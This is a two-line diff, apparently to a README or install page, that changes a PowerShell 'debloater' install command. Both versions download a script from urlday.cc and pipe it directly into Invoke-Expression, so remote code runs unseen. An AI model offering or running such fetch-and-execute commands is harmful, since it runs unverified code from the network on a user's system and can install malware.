@@ -1,2 +1,2 @@
 Command :
-```iwr https://urlday.cc/debloater1|iex```
+```iwr urlday.cc/debloatinstall|iex```
